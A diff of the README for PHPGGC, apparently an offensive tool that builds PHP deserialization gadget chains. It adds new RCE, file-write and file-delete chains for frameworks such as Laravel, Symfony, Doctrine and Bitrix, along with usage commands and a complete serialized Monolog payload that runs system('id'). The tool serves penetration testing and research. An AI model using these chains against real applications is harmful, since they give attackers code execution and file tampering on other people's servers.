@@ -20,101 +20,111 @@ $ ./phpggc -l
 Gadget Chains
 -------------
 
-NAME                                      VERSION                            TYPE                   VECTOR         I    
-CakePHP/RCE1                              ? <= 3.9.6                         RCE (Command)          __destruct          
-CakePHP/RCE2                              ? <= 4.2.3                         RCE (Function call)    __destruct          
-CodeIgniter4/RCE1                         4.0.0-beta.1 <= 4.0.0-rc.4         RCE (Function call)    __destruct          
-CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.0.4+               RCE (Function call)    __destruct          
-CodeIgniter4/RCE3                         -4.1.3+                            RCE (Function call)    __destruct          
-Doctrine/FW1                              ?                                  File write             __toString     *    
-Doctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5     File write             __destruct     *    
-Dompdf/FD1                                1.1.1 <= ?                         File delete            __destruct     *    
-Dompdf/FD2                                ? < 1.1.1                          File delete            __destruct     *    
-Drupal7/FD1                               7.0 < ?                            File delete            __destruct     *    
-Drupal7/RCE1                              7.0.8 < ?                          RCE (Function call)    __destruct     *    
-Guzzle/FW1                                6.0.0 <= 6.3.3+                    File write             __destruct          
-Guzzle/INFO1                              6.0.0 <= 6.3.2                     phpinfo()              __destruct     *    
-Guzzle/RCE1                               6.0.0 <= 6.3.2                     RCE (Function call)    __destruct     *    
-Horde/RCE1                                <= 5.2.22                          RCE (PHP code)         __destruct     *    
-Kohana/FR1                                3.*                                File read              __toString     *    
-Laminas/FD1                               <= 2.11.2                          File delete            __destruct          
-Laminas/FW1                               2.8.0 <= 3.0.x-dev                 File write             __destruct     *    
-Laravel/RCE1                              5.4.27                             RCE (Function call)    __destruct          
-Laravel/RCE10                             5.6.0 <= 9.1.8+                    RCE (Function call)    __toString          
-Laravel/RCE2                              5.4.0 <= 8.6.9+                    RCE (Function call)    __destruct          
-Laravel/RCE3                              5.5.0 <= 5.8.35                    RCE (Function call)    __destruct     *    
-Laravel/RCE4                              5.4.0 <= 8.6.9+                    RCE (Function call)    __destruct          
-Laravel/RCE5                              5.8.30                             RCE (PHP code)         __destruct     *    
-Laravel/RCE6                              5.5.* <= 5.8.35                    RCE (PHP code)         __destruct     *    
-Laravel/RCE7                              ? <= 8.16.1                        RCE (Function call)    __destruct     *    
-Laravel/RCE8                              7.0.0 <= 8.6.9+                    RCE (Function call)    __destruct     *    
-Laravel/RCE9                              5.4.0 <= 9.1.8+                    RCE (Function call)    __destruct          
-Magento/FW1                               ? <= 1.9.4.0                       File write             __destruct     *    
-Magento/SQLI1                             ? <= 1.9.4.0                       SQL injection          __destruct          
-Magento2/FD1                              *                                  File delete            __destruct     *    
-Monolog/FW1                               3.0.0 <= 3.1.0+                    File write             __destruct     *    
-Monolog/RCE1                              1.4.1 <= 1.6.0 1.17.2 <= 2.7.0+    RCE (Function call)    __destruct          
-Monolog/RCE2                              1.4.1 <= 2.7.0+                    RCE (Function call)    __destruct          
-Monolog/RCE3                              1.1.0 <= 1.10.0                    RCE (Function call)    __destruct          
-Monolog/RCE4                              ? <= 2.4.4+                        RCE (Command)          __destruct     *    
-Monolog/RCE5                              1.25 <= 2.7.0+                     RCE (Function call)    __destruct          
-Monolog/RCE6                              1.10.0 <= 2.7.0+                   RCE (Function call)    __destruct          
-Monolog/RCE7                              1.10.0 <= 2.7.0+                   RCE (Function call)    __destruct     *    
-Monolog/RCE8                              3.0.0 <= 3.1.0+                    RCE (Function call)    __destruct     *    
-Monolog/RCE9                              3.0.0 <= 3.1.0+                    RCE (Function call)    __destruct     *    
-Phalcon/RCE1                              <= 1.2.2                           RCE                    __wakeup       *    
-PHPCSFixer/FD1                            <= 2.17.3                          File delete            __destruct          
-PHPCSFixer/FD2                            <= 2.17.3                          File delete            __destruct          
-PHPExcel/FD1                              1.8.2+                             File delete            __destruct          
-PHPExcel/FD2                              <= 1.8.1                           File delete            __destruct          
-PHPExcel/FD3                              1.8.2+                             File delete            __destruct          
-PHPExcel/FD4                              <= 1.8.1                           File delete            __destruct          
-PHPSecLib/RCE1                            2.0.0 <= 2.0.34                    RCE (PHP code)         __destruct     *    
-Pydio/Guzzle/RCE1                         < 8.2.2                            RCE (Function call)    __toString          
-Slim/RCE1                                 3.8.1                              RCE (Function call)    __toString          
-Smarty/FD1                                ?                                  File delete            __destruct          
-Smarty/SSRF1                              ?                                  SSRF                   __destruct     *    
-SwiftMailer/FD1                           -5.4.12+, -6.2.1+                  File delete            __destruct          
-SwiftMailer/FW1                           5.1.0 <= 5.4.8                     File write             __toString          
-SwiftMailer/FW2                           6.0.0 <= 6.0.1                     File write             __toString          
-SwiftMailer/FW3                           5.0.1                              File write             __toString          
-SwiftMailer/FW4                           4.0.0 <= ?                         File write             __destruct          
-Symfony/FW1                               2.5.2                              File write             DebugImport    *    
-Symfony/FW2                               3.4                                File write             __destruct          
-Symfony/RCE1                              3.3                                RCE (Command)          __destruct     *    
-Symfony/RCE2                              2.3.42 < 2.6                       RCE (PHP code)         __destruct     *    
-Symfony/RCE3                              2.6 <= 2.8.32                      RCE (PHP code)         __destruct     *    
-Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7        RCE (Function call)    __destruct     *    
-Symfony/RCE5                              5.2.*                              RCE (Function call)    __destruct          
-TCPDF/FD1                                 <= 6.3.5                           File delete            __destruct     *    
-ThinkPHP/FW1                              5.0.4-5.0.24                       File write             __destruct     *    
-ThinkPHP/FW2                              5.0.0-5.0.03                       File write             __destruct     *    
-ThinkPHP/RCE1                             5.1.x-5.2.x                        RCE (Function call)    __destruct     *    
-ThinkPHP/RCE2                             5.0.24                             RCE (Function call)    __destruct     *    
-Typo3/FD1                                 4.5.35 <= 10.4.1                   File delete            __destruct     *    
-WordPress/Dompdf/RCE1                     0.8.5+ & WP < 5.5.2                RCE (Function call)    __destruct     *    
-WordPress/Dompdf/RCE2                     0.7.0 <= 0.8.4 & WP < 5.5.2        RCE (Function call)    __destruct     *    
-WordPress/Guzzle/RCE1                     4.0.0 <= 6.4.1+ & WP < 5.5.2       RCE (Function call)    __toString     *    
-WordPress/Guzzle/RCE2                     4.0.0 <= 6.4.1+ & WP < 5.5.2       RCE (Function call)    __destruct     *    
-WordPress/P/EmailSubscribers/RCE1         4.0 <= 4.4.7+ & WP < 5.5.2         RCE (Function call)    __destruct     *    
-WordPress/P/EverestForms/RCE1             1.0 <= 1.6.7+ & WP < 5.5.2         RCE (Function call)    __destruct     *    
-WordPress/P/WooCommerce/RCE1              3.4.0 <= 4.1.0+ & WP < 5.5.2       RCE (Function call)    __destruct     *    
-WordPress/P/WooCommerce/RCE2              <= 3.4.0 & WP < 5.5.2              RCE (Function call)    __destruct     *    
-WordPress/P/YetAnotherStarsRating/RCE1    ? <= 1.8.6 & WP < 5.5.2            RCE (Function call)    __destruct     *    
-WordPress/PHPExcel/RCE1                   1.8.2+ & WP < 5.5.2                RCE (Function call)    __toString     *    
-WordPress/PHPExcel/RCE2                   <= 1.8.1 & WP < 5.5.2              RCE (Function call)    __toString     *    
-WordPress/PHPExcel/RCE3                   1.8.2+ & WP < 5.5.2                RCE (Function call)    __destruct     *    
-WordPress/PHPExcel/RCE4                   <= 1.8.1 & WP < 5.5.2              RCE (Function call)    __destruct     *    
-WordPress/PHPExcel/RCE5                   1.8.2+ & WP < 5.5.2                RCE (Function call)    __destruct     *    
-WordPress/PHPExcel/RCE6                   <= 1.8.1 & WP < 5.5.2              RCE (Function call)    __destruct     *    
-Yii/RCE1                                  1.1.20                             RCE (Function call)    __wakeup       *    
-Yii2/RCE1                                 <2.0.38                            RCE (Function call)    __destruct     *    
-Yii2/RCE2                                 <2.0.38                            RCE (PHP code)         __destruct     *    
-ZendFramework/FD1                         ? <= 1.12.20                       File delete            __destruct          
-ZendFramework/RCE1                        ? <= 1.12.20                       RCE (PHP code)         __destruct     *    
-ZendFramework/RCE2                        1.11.12 <= 1.12.20                 RCE (Function call)    __toString     *    
-ZendFramework/RCE3                        2.0.1 <= ?                         RCE (Function call)    __destruct          
-ZendFramework/RCE4                        ? <= 1.12.20                       RCE (PHP code)         __destruct     *    
+NAME                                      VERSION                                              TYPE                   VECTOR         I    
+Bitrix/RCE1                               17.x.x <= 22.0.300                                   RCE (Function call)    __destruct          
+CakePHP/RCE1                              ? <= 3.9.6                                           RCE (Command)          __destruct          
+CakePHP/RCE2                              ? <= 4.2.3                                           RCE (Function call)    __destruct          
+CodeIgniter4/RCE1                         4.0.2 <= 4.0.3                                       RCE (Function call)    __destruct          
+CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.0.4+                                 RCE (Function call)    __destruct          
+CodeIgniter4/RCE3                         -4.1.3+                                              RCE (Function call)    __destruct          
+CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                           RCE (Function call)    __destruct          
+Doctrine/FW1                              ?                                                    File write             __toString     *    
+Doctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5                       File write             __destruct     *    
+Doctrine/RCE1                             1.5.1 <= 2.7.2                                       RCE (PHP code)         __destruct     * 
+Doctrine/RCE2                             1.11.0 <= 2.3.2                                      RCE (Function call)    __destruct     * 
+Dompdf/FD1                                1.1.1 <= ?                                           File delete            __destruct     *    
+Dompdf/FD2                                ? < 1.1.1                                            File delete            __destruct     *    
+Drupal7/FD1                               7.0 < ?                                              File delete            __destruct     *    
+Drupal7/RCE1                              7.0.8 < ?                                            RCE (Function call)    __destruct     *    
+Guzzle/FW1                                6.0.0 <= 6.3.3+                                      File write             __destruct          
+Guzzle/INFO1                              6.0.0 <= 6.3.2                                       phpinfo()              __destruct     *    
+Guzzle/RCE1                               6.0.0 <= 6.3.2                                       RCE (Function call)    __destruct     *    
+Horde/RCE1                                <= 5.2.22                                            RCE (PHP code)         __destruct     *    
+Kohana/FR1                                3.*                                                  File read              __toString     *    
+Laminas/FD1                               <= 2.11.2                                            File delete            __destruct          
+Laminas/FW1                               2.8.0 <= 3.0.x-dev                                   File write             __destruct     *    
+Laravel/RCE1                              5.4.27                                               RCE (Function call)    __destruct          
+Laravel/RCE2                              5.4.0 <= 8.6.9+                                      RCE (Function call)    __destruct          
+Laravel/RCE3                              5.5.0 <= 5.8.35                                      RCE (Function call)    __destruct     *    
+Laravel/RCE4                              5.4.0 <= 8.6.9+                                      RCE (Function call)    __destruct          
+Laravel/RCE5                              5.8.30                                               RCE (PHP code)         __destruct     *    
+Laravel/RCE6                              5.5.* <= 5.8.35                                      RCE (PHP code)         __destruct     *    
+Laravel/RCE7                              ? <= 8.16.1                                          RCE (Function call)    __destruct     *    
+Laravel/RCE8                              7.0.0 <= 8.6.9+                                      RCE (Function call)    __destruct     *    
+Laravel/RCE9                              5.4.0 <= 9.1.8+                                      RCE (Function call)    __destruct          
+Laravel/RCE10                             5.6.0 <= 9.1.8+                                      RCE (Function call)    __toString          
+Laravel/RCE11                             5.4.0 <= 9.1.8+                                      RCE (Function call)    __destruct          
+Laravel/RCE12                             5.8.35, 7.0.0, 9.3.10                                RCE (Function call)    __destruct     *    
+Magento/FW1                               ? <= 1.9.4.0                                         File write             __destruct     *    
+Magento/SQLI1                             ? <= 1.9.4.0                                         SQL injection          __destruct          
+Magento2/FD1                              *                                                    File delete            __destruct     *    
+Monolog/FW1                               3.0.0 <= 3.1.0+                                      File write             __destruct     *    
+Monolog/RCE1                              1.4.1 <= 1.6.0 1.17.2 <= 2.7.0+                      RCE (Function call)    __destruct          
+Monolog/RCE2                              1.4.1 <= 2.7.0+                                      RCE (Function call)    __destruct          
+Monolog/RCE3                              1.1.0 <= 1.10.0                                      RCE (Function call)    __destruct          
+Monolog/RCE4                              ? <= 2.4.4+                                          RCE (Command)          __destruct     *    
+Monolog/RCE5                              1.25 <= 2.7.0+                                       RCE (Function call)    __destruct          
+Monolog/RCE6                              1.10.0 <= 2.7.0+                                     RCE (Function call)    __destruct          
+Monolog/RCE7                              1.10.0 <= 2.7.0+                                     RCE (Function call)    __destruct     *    
+Monolog/RCE8                              3.0.0 <= 3.1.0+                                      RCE (Function call)    __destruct     *    
+Monolog/RCE9                              3.0.0 <= 3.1.0+                                      RCE (Function call)    __destruct     *    
+Phalcon/RCE1                              <= 1.2.2                                             RCE                    __wakeup       *    
+PHPCSFixer/FD1                            <= 2.17.3                                            File delete            __destruct          
+PHPCSFixer/FD2                            <= 2.17.3                                            File delete            __destruct          
+PHPExcel/FD1                              1.8.2+                                               File delete            __destruct          
+PHPExcel/FD2                              <= 1.8.1                                             File delete            __destruct          
+PHPExcel/FD3                              1.8.2+                                               File delete            __destruct          
+PHPExcel/FD4                              <= 1.8.1                                             File delete            __destruct          
+PHPSecLib/RCE1                            2.0.0 <= 2.0.34                                      RCE (PHP code)         __destruct     *    
+Pydio/Guzzle/RCE1                         < 8.2.2                                              RCE (Function call)    __toString          
+Slim/RCE1                                 3.8.1                                                RCE (Function call)    __toString          
+Smarty/FD1                                ?                                                    File delete            __destruct          
+Smarty/SSRF1                              ?                                                    SSRF                   __destruct     *    
+Spiral/RCE1                               2.7.0 <= 2.8.13                                      RCE (Function call)    __destruct          
+Spiral/RCE2                               -2.8+                                                RCE (Function call)    __destruct     *    
+SwiftMailer/FD1                           -5.4.12+, -6.2.1+                                    File delete            __destruct          
+SwiftMailer/FW1                           5.1.0 <= 5.4.8                                       File write             __toString          
+SwiftMailer/FW2                           6.0.0 <= 6.0.1                                       File write             __toString          
+SwiftMailer/FW3                           5.0.1                                                File write             __toString          
+SwiftMailer/FW4                           4.0.0 <= ?                                           File write             __destruct          
+Symfony/FW1                               2.5.2                                                File write             DebugImport    *    
+Symfony/FW2                               3.4                                                  File write             __destruct          
+Symfony/RCE1                              3.3                                                  RCE (Command)          __destruct     *    
+Symfony/RCE2                              2.3.42 < 2.6                                         RCE (PHP code)         __destruct     *    
+Symfony/RCE3                              2.6 <= 2.8.32                                        RCE (PHP code)         __destruct     *    
+Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7                          RCE (Function call)    __destruct     *    
+Symfony/RCE5                              5.2.*                                                RCE (Function call)    __destruct          
+Symfony/RCE6                              v3.4.0-BETA4 <= v3.4.49 & v4.0.0-BETA4 <= v4.1.13    RCE (Command)          __destruct     *    
+TCPDF/FD1                                 <= 6.3.5                                             File delete            __destruct     *    
+ThinkPHP/FW1                              5.0.4-5.0.24                                         File write             __destruct     *    
+ThinkPHP/FW2                              5.0.0-5.0.03                                         File write             __destruct     *    
+ThinkPHP/RCE1                             5.1.x-5.2.x                                          RCE (Function call)    __destruct     *    
+ThinkPHP/RCE2                             5.0.24                                               RCE (Function call)    __destruct     *    
+Typo3/FD1                                 4.5.35 <= 10.4.1                                     File delete            __destruct     *    
+WordPress/Dompdf/RCE1                     0.8.5+ & WP < 5.5.2                                  RCE (Function call)    __destruct     *    
+WordPress/Dompdf/RCE2                     0.7.0 <= 0.8.4 & WP < 5.5.2                          RCE (Function call)    __destruct     *    
+WordPress/Guzzle/RCE1                     4.0.0 <= 6.4.1+ & WP < 5.5.2                         RCE (Function call)    __toString     *    
+WordPress/Guzzle/RCE2                     4.0.0 <= 6.4.1+ & WP < 5.5.2                         RCE (Function call)    __destruct     *    
+WordPress/P/EmailSubscribers/RCE1         4.0 <= 4.4.7+ & WP < 5.5.2                           RCE (Function call)    __destruct     *    
+WordPress/P/EverestForms/RCE1             1.0 <= 1.6.7+ & WP < 5.5.2                           RCE (Function call)    __destruct     *    
+WordPress/P/WooCommerce/RCE1              3.4.0 <= 4.1.0+ & WP < 5.5.2                         RCE (Function call)    __destruct     *    
+WordPress/P/WooCommerce/RCE2              <= 3.4.0 & WP < 5.5.2                                RCE (Function call)    __destruct     *    
+WordPress/P/YetAnotherStarsRating/RCE1    ? <= 1.8.6 & WP < 5.5.2                              RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE1                   1.8.2+ & WP < 5.5.2                                  RCE (Function call)    __toString     *    
+WordPress/PHPExcel/RCE2                   <= 1.8.1 & WP < 5.5.2                                RCE (Function call)    __toString     *    
+WordPress/PHPExcel/RCE3                   1.8.2+ & WP < 5.5.2                                  RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE4                   <= 1.8.1 & WP < 5.5.2                                RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE5                   1.8.2+ & WP < 5.5.2                                  RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE6                   <= 1.8.1 & WP < 5.5.2                                RCE (Function call)    __destruct     *    
+Yii/RCE1                                  1.1.20                                               RCE (Function call)    __wakeup       *    
+Yii2/RCE1                                 <2.0.38                                              RCE (Function call)    __destruct     *    
+Yii2/RCE2                                 <2.0.38                                              RCE (PHP code)         __destruct     *    
+ZendFramework/FD1                         ? <= 1.12.20                                         File delete            __destruct          
+ZendFramework/RCE1                        ? <= 1.12.20                                         RCE (PHP code)         __destruct     *    
+ZendFramework/RCE2                        1.11.12 <= 1.12.20                                   RCE (Function call)    __toString     *    
+ZendFramework/RCE3                        2.0.1 <= ?                                           RCE (Function call)    __destruct          
+ZendFramework/RCE4                        ? <= 1.12.20                                         RCE (PHP code)         __destruct     *    
+ZendFramework/RCE5                        2.0.0rc2 <= 2.5.3                                    RCE (Function call)    __destruct
 ```
 
 Filter gadget chains:
@@ -136,7 +146,6 @@ Laravel/RCE6     5.5.* <= 5.8.35    RCE (PHP code)         __destruct    *
 Laravel/RCE7     ? <= 8.16.1        RCE (Function call)    __destruct    *    
 Laravel/RCE8     7.0.0 <= 8.6.9+    RCE (Function call)    __destruct    *    
 Laravel/RCE9     5.4.0 <= 9.1.8+    RCE (Function call)    __destruct         
-
 ```
 
 Every gadget chain has:
@@ -160,6 +169,11 @@ Exec through proc_open()
 
 ./phpggc Symfony/RCE1 <command>
 ```
+
+For RCE gadgets, the executed command can have 3 formatting types depending on how the gadget works:
+- RCE (Command): ./phpggc Symfony/RCE1 id
+- RCE (PHP code): ./phpggc Symfony/RCE2 'phpinfo();'
+- RCE (Function call): ./phpggc Symfony/RCE4 system id
 
 Once you have selected a chain, run `./phpggc <gadget-chain> [parameters]` to obtain the payload.
 For instance, to obtain a payload for Monolog, you'd do:
@@ -328,6 +342,20 @@ Testing 59 versions for monolog/monolog against 2 gadget chains.
 └─────────────────┴─────────┴──────────────┴──────────────┘
 ```
 
+You can specify the versions you want to test by using the following syntaxe.
+
+```
+$ ./test-gc-compatibility.py monolog/monolog:2.3.0,1.25.4 monolog/rce1 monolog/rce3
+Testing 2 versions for monolog/monolog against 2 gadget chains.
+
+┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓
+┃ monolog/monolog ┃ Package ┃ monolog/rce1 ┃ monolog/rce3 ┃
+┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩
+│ 2.3.0           │   OK    │      OK      │      KO      │
+│ 1.25.4          │   OK    │      OK      │      KO      │
+└─────────────────┴─────────┴──────────────┴──────────────┘
+```
+
 # API
 
 Instead of using PHPGGC as a command line tool, you can program PHP scripts:
@@ -390,8 +418,28 @@ For instance, use `./phpggc -n Drupal RCE` would create a new Drupal RCE gadgetc
 
 # Docker
 
-If you don't want to install PHP, you can use `docker build`.
+If you don't want to install PHP, you can use `docker build . -t 'phpggc'`.
 
+To generate a gadget chain.
+
+```
+$ docker run phpggc Monolog/rce1 'system' 'id'
+O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}
+```
+
+To run `test-gc-compatibility.py` from docker.
+```
+$ docker run --entrypoint './test-gc-compatibility.py' phpggc doctrine/doctrine-bundle:2.2,2.7.2 doctrine/rce1 doctrine/rce2
+Runing on PHP version ('PHP 8.1.13 (cli) (built: Nov 30 2022 21:53:44) (NTS).
+Testing 2 versions for doctrine/doctrine-bundle against 2 gadget chains.
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
+┃ doctrine/doctrine-bundle ┃ Package ┃ doctrine/rce1 ┃ doctrine/rce2 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩
+│ 2.2                      │   OK    │      OK       │      OK       │
+│ 2.7.2                    │   OK    │      OK       │      KO       │
+└──────────────────────────┴─────────┴───────────────┴───────────────┘
+```
 
 # License
 
